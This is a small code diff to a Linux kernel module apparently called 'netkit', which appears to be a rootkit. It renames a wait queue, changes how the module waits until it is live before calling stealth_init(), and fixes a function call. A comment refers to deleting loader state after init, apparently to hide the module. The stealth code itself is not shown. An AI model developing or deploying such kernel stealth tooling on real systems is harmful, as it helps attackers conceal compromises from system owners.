@@ -11,13 +11,15 @@
 
 static int netkit_main(void* args)
 {
-    DECLARE_WAIT_QUEUE_HEAD(wait_queue);
+    DECLARE_WAIT_QUEUE_HEAD(mod_state_wait_queue);
     int retv;
 
     pr_err("[+] module started (debug: %d)\n", CONFIG_NETKIT_DEBUG);
 
 #if CONFIG_NETKIT_STEALTH
-    wait_event(wait_queue, THIS_MODULE->state == MODULE_STATE_LIVE);
+    NETKIT_LOG("[*] waiting for module to be ready...\n");
+    // poll every 100ms
+    wait_event_interruptible_timeout(mod_state_wait_queue, THIS_MODULE->state == MODULE_STATE_LIVE, HZ / 10);
 
     NETKIT_LOG("[*] starting stealth...\n");
     retv = stealth_init();
@@ -42,7 +44,7 @@ static int __init netkit_init(void)
     // be able to delete things required by the module loader post THIS_MODULE->init()
     kthread_run(netkit_main, NULL, "netkit-main");
 #else
-    netkit_main();
+    netkit_main(NULL);
 #endif
 
     return 0;
